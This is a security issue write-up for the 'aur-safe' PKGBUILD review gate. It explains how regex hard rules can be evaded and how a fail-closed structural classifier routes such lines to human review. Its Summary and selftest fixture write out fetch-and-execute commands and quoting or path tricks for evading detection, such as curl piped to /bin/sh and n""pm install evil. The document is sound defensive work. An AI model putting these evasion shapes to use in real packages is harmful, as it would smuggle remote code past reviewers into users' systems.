# gh#6 — Hard rules are brittle and can be evaded into review (Cohort 2 H2)

**Source:** GitHub issue [#6](https://github.com/bermudi/aur-check/issues/6)
(Cohort 2, high H2)
**Status:** fixed
**Severity:** high
**Lines:** rule list at `aur-safe:152-191`; fail-closed PKGBUILD structural
classifier at `aur-safe:678-995` and `classify_diff_rules()` at
`aur-safe:1684-1997`; selftest fixture at `aur-safe:5320-5325`

## Summary

`aur-safe`'s hard-fail rules are extended regexes applied to raw added diff
lines. They are fast and useful for known campaign patterns (`npm install`,
`curl | sh`, `eval $(curl ...)`, etc.), but they are not a shell tokenizer.
Issue #6 showed several ways to avoid the deterministic `hard` (exit 1) bucket
while still executing equivalent commands:

- Quoted/escaped command names: `n""pm install evil`, `'n'pm install evil`,
  `\npm install evil`.
- Absolute interpreter paths: `curl ... | /bin/sh`, `/usr/bin/sh -c "$(curl ...)"`.
- Alternate subcommands/invocations: `openssl base64 -d`,
  `python3 -m pip install evil`, `git submodule update --init`.

Some of these still trigger a review rule or the structural classifier, but the
finding correctly observed that regexes alone are an evasion surface: an
attacker can tweak quoting, paths, or subcommands faster than a fixed list of
patterns can track.

## Fix

The primary resolution is not to keep hardening the regex list until it becomes
a shell parser. Instead, the gate treats **hard rules as defense-in-depth fast
signals** and relies on the **fail-closed structural PKGBUILD classifier** as
the primary boundary.

The classifier (`classify_diff_rules()`) already:

1. Proves every added PKGBUILD line is in ordinary one-line lexical context
   (`_pkgbuild_line_has_plain_context()` / `_pkgbuild_candidate_line_context()`);
   unclosed quotes, heredocs, backslash continuations, and command substitutions
   make the whole sticky state unsafe.
2. Matches the line against a narrow positive grammar for safe metadata:
   `pkgver`/`pkgrel`/`epoch` literals, `_commit`/version-style variables,
   literal `license`/`arch`/`groups`/`noextract` arrays, checksum arrays of
   literal hex/`SKIP`, and `source=()` members that pass the fail-closed URI
   policy.
3. Sends **everything else** to `review` (exit 2), never to `boring` or
   `boring_edge`.

Because PKGBUILD is executable Bash and the classifier is file-aware, the issue
examples above are routed to review regardless of whether the hard regex
happened to match. The diff path and the missing-cache baseline-recovery path
share this same classifier (`scan_diff_rules` / `_scan_whole_pkg`), so the
backstop cannot drift.

A concrete selftest fixture was added to pin this behavior: a `build()` function
containing `n""pm install evil`, `'n'pm install evil`, `curl -s http://x | /bin/sh`,
and `git submodule update --init` is classified as `review` (not `hard` or
`boring`) because those shapes fall through the regex rules and are caught by
the fail-closed structural boundary. (Note: some example variants, such as
`openssl base64 -d` and `\npm install evil`, are in fact matched by the current
unanchored hard rules, which is fine — the structural boundary is still the
non-negotiable backstop.)

No new hard or review rules were added for the quoted/path variants; the
design-ledger and threat model explicitly reject name-list blacklists because
the attacker can rotate names faster than lists can track.

## Verification

- `bash -n aur-safe` — clean.
- `shellcheck -s bash aur-safe` — clean (SC2016/SC2001 excluded via
  `.shellcheckrc`).
- `./aur-safe selftest </dev/null` — 314 passed, 0 failed, including
  `classifier-gh6-hard-rule-evasions-review`.

## Lesson

Regexes over raw diff lines are a useful first signal but are inherently
brittle. The deterministic gate must therefore be fail-closed: every added
PKGBUILD line that is not proven safe by positive grammar and lexical context
goes to human review. The hard rules speed up common cases; the structural
classifier guarantees that quoting tricks, absolute paths, and alternate
subcommands cannot silently auto-clear.
